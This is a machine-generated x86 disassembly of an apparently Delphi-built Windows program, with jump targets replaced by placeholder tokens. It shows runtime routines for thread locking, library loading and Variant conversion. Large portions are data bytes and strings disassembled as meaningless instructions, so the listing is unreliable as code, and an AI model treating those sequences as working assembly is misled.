call sub_403f64
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_40f6e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov bl 0x1
call GetCurrentThreadId
mov edi eax
cmp edi [ ebp + 0x24 ]
je r-xdata
inc [ ebp + 0x1c ]
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40f6a4
mov eax [ ebp + 0x28 ]
mov [ esp + 0x4 ] eax
mov edx esp
mov eax [ ebp + 0x20 ]
call sub_40f51c
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff0001
call sub_40f4a0
cmp eax 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
call sub_40f480
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff
call sub_40f4a0
mov esi eax
test esi esi
je r-xdata
mov eax ebp
call sub_40f6a4
test bl bl
je r-xdata
mov eax ebp
call sub_40f6d8
mov [ ebp + 0x24 ] edi
lea eax [ ebp + 0x28 ]
call sub_40f480
dec eax
cmp eax [ esp + 0x4 ]
sete bl
lea eax [ ebp + 0xc ]
call sub_40f48c
sub_40f794
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f51c
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40f4a0
mov eax ebx
call sub_40f6bc
mov eax ebx
call sub_40f6b0
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f594
sub_40f7e4
push ebx
push esi
push edi
push ecx
mov edi eax
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40f51c
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ edi + 0x24 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_40f6c8
jmp r-xdata
lea eax [ edi + 0xc ]
call sub_40f48c
test eax eax
jle r-xdata
lea eax [ edi + 0xc ]
call sub_40f480
mov esi eax
cmp esi 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax edi
call sub_40f6c8
mov eax edi
call sub_40f6bc
sub_40f854
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f51c
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40f594
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40f480
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40f6bc
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40f6bc
sub_40f8cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40f8f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f967
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_406af4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_404018
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f96e
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_404018
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40f8cc
test al al
jne r-xdata
mov al 0x1
sub_40f988
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40f9fa
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40f9dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405324
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f9e3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40fa0c
sbb eax 0x20000000
jpe r-xdata
mov bl 0x4a
add al dl
jns r-xdata
add [ eax - 0x4c ] ah
dec edx
add [ eax ] bl
jpe r-xdata
mov dl 0x4a
add [ eax - 0x27ffb587 ] al
add [ edx + esi * 4 + 0x4a ] bl
add al cl
jns r-xdata
mov dl 0x4a
add al dl
mov dl 0x4a
add [ eax ] dl
jpe r-xdata
mov al 0x4a
add [ ebp + esi * 4 + 0x4a ] ch
add [ eax ] al
xor al 0x79
dec edx
add [ eax - 0x50 ] al
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jns r-xdata
mov ch 0x4a
add [ eax + 0x79 ] bh
dec edx
add al dh
add [ eax - 0x4e ] ch
dec edx
add al al
jns r-xdata
mov dl 0x4a
add [ eax ] dh
mov al 0x4a
add [ eax ] cl
jpe r-xdata
mov dl 0x4a
add [ eax ] dl
mov ah 0x4a
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] dl
dec edx
add [ eax ] cl
mov cl 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jns r-xdata
add [ esp + esi * 4 + 0x4a ] dh
add [ eax ] al
sub al 0x79
dec edx
add ah ch
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jns r-xdata
mov ch 0x4a
add [ eax + 0x79 ] dh
dec edx
add [ eax - 0x4f ] dl
dec edx
add [ eax + 0x79 ] ch
dec edx
add ah dl
mov al 0x4a
add [ eax + 0x79 ] ah
dec edx
add ah bl
mov bl 0x4a
add [ eax + 0x79 ] bl
dec edx
add ah cl
mov ah 0x4a
add [ eax + 0x79 ] dl
dec edx
add al ah
scasd [ edi ]
dec edx
add [ eax + 0x79 ] cl
dec edx
add ah cl
mov ch 0x4a
add [ eax + 0x79 ] al
dec edx
add [ edx + esi * 4 + 0x4a ] bh
add [ eax ] ch
add [ eax ] al
add [ eax ] bh
jns r-xdata
add al dl
mov ch 0x4a
add [ eax + 0x64004a79 ] bh
add al bl
mov ah 0x4a
add [ eax ] al
jpe r-xdata
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add al ah
js r-xdata
add al al
mov cl 0x4a
add [ eax ] al
add [ eax ] al
add al bh
js r-xdata
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add ah dh
js r-xdata
add ah cl
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] cl
dec edx
add [ eax ] bl
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jns r-xdata
add [ ecx + esi * 4 ] dl
dec edx
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] ah
dec edx
add [ ecx + esi * 4 ] al
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jns r-xdata
mov dl 0x4a
add [ eax - 0x73ffb587 ] dh
mov dh 0x4a
add [ eax + 0x14004a79 ] ch
add [ esi * 4 + 0x79f8004a ] ah
dec edx
add [ ecx + esi * 4 + 0x4a ] ch
add al dh
jns r-xdata
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add ah al
js r-xdata
add [ ebx + esi * 4 + 0x4a ] dl
add [ eax ] al
add [ eax ] al
add ah bl
js r-xdata
mov bl 0x4a
add al ch
mov dl 0x4a
add [ eax ] al
add [ eax ] al
add al bl
js r-xdata
add [ eax ] al
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add al dh
js r-xdata
mov bl 0x4a
add [ esi * 4 + 0x4a ] al
add [ eax ] al
add al 0x79
dec edx
add [ eax - 0x4c ] cl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] bl
dec edx
add [ eax - 0x4e ] bh
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jns r-xdata
add [ eax + esi * 4 + 0x4a ] ch
mov ah 0x4a
add [ eax - 0x17ffb587 ] ah
add [ eax - 0x17ffb54e ] ch
jns r-xdata
mov ch 0x4a
add [ ecx + esi * 4 + 0x4a ] cl
add [ eax ] al
add [ eax ] al
add al al
js r-xdata
mov cl 0x4a
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x3bffb588 ] ch
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 - 0x4a97ffb6 ] bh
dec edx
add ah ah
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add ah dl
js r-xdata
add [ eax ] al
add [ eax ] al
add ah ch
js r-xdata
add [ ebx + esi * 4 + 0x4a ] dh
mov dl 0x4a
add [ eax ] al
add [ ecx + esi * 4 + 0x4a ] ah
add [ eax ] al
call 0x30414669
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add ah ah
js r-xdata
add [ eax ] al
add [ eax ] al
add ah bh
js r-xdata
add [ eax - 0x4e ] bl
dec edx
mov bl 0x4a
add [ eax - 0x5fffb587 ] bl
add al dl
scasd [ edi ]
dec edx
add al ah
jns r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe62
retn
mov eax rw-data
call sub_40f8bc
mov eax r-xdata
call sub_4069b4
call sub_40f400
call sub_40e2ec
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_40566c
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov edx [ r-xdata ]
call sub_406410
mov eax rw-data
mov edx [ r-xdata ]
call sub_406410
mov eax rw-data
call sub_404e44
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40ddcc ]
call sub_405af0
mov bl 0x4a
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 - 0x49a3ffb6 ] ah
dec edx
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb588 ] al
mov dl 0x4a
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x4a ] bh
add [ ecx + esi * 4 + 0x4a ] bl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40fe5b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add ah bh
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb588 ] bh
mov ch 0x4a
add [ eax ] al
add al dl
js r-xdata
add [ eax + 0x4ab2 ] bh
mov dh 0x4a
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 - 0x4f87ffb6 ] dh
dec edx
add ah bh
mov ch 0x4a
add [ eax ] al
add [ eax ] al
add ah cl
js r-xdata
mov ch 0x4a
add al dh
mov dh 0x4a
add [ eax + 0x20004a79 ] dl
add [ ebx + esi * 4 ] dh
dec edx
add al bl
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb588 ] dh
mov al 0x4a
add [ eax ] al
add [ eax ] al
add al cl
js r-xdata
add [ ebp + esi * 4 + 0x4a ] bh
scasd [ edi ]
dec edx
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 - 0x4a43ffb6 ] ch
dec edx
add al cl
mov dh 0x4a
add [ eax - 0x7bffb587 ] cl
add [ ebx + esi * 4 + 0x79d0004a ] dh
dec edx
sub_40fe84
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
movzx eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40fed8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ff32
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409a3c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ff39
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_40ff44
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40ff9e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b9a4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffa5
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_40ffb0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41000a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b978
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410011
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41001c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_410076
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40d304
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41007d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_410088
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4100e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b9d0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100e9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4100f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_410161
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4050e8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_409ba4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410168
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_410174
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4101d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40b8f4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4057bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4101db
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4101e4
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_410246
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40ca08
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_4057bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41024d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_410258
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4102bc
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_409c40
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4057bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102c3
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4102ec
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_410318
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40fe84
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40feb4
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40feb4
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fec0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fecc
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40fed8
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ff44
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ffb0
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_41001c
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410088
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4100f4
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410174
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_4101e4
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_410258
mov eax r-xdata
call sub_4102ec
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_410624
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410649
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410650
retn
sub_410759
push es
inc ecx
add [ eax ] dl
adc [ eax ] eax
add [ eax ] al
or [ esi + 0x61 ] dl
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0xc0041 ] al
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
lea eax [ eax ]
mov esp 0x4107
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax + 0xc0041 ] bh
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
jb r-xdata
popad
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
and [ eax ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
or [ ecx ] al
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
or [ ecx ] al
or al 0x0
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc ebp
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add ah bh
inc eax
jb r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc4149c9
add [ eax ] al
add ah ah
mov al [ eax ]
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
outsd
jb r-xdata
popad
jae r-xdata
inc ebx
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx + 0x41 ] cl
add [ eax + eax ] cl
or [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x9
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
outsd
jb r-xdata
add [ eax ] al
in al 0x8a
inc eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
or [ ecx ] eax
or al 0x0
outsd
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
adc eax 0x72615645
jns r-xdata
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] dl
outsb
jbe r-xdata
rol [ eax + ecx + 0x41 ] 0x0
add [ eax ] al
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
add ah bh
inc eax
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
or [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
shr al 0x8
inc ecx
add [ eax ] al
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
add [ eax ] al
call sub_4149a9
inc ebx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x72615645 ] dl
mov esp 0xc0004041
inc ecx
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsd
jb r-xdata
inc eax
add [ edi + edi + 0x40 ] dl
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa
add [ eax - 0x43ffbfbf ] bh
inc ecx
jb r-xdata
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
jb r-xdata
lodsb [ esi ]
inc ecx
inc eax
inc eax
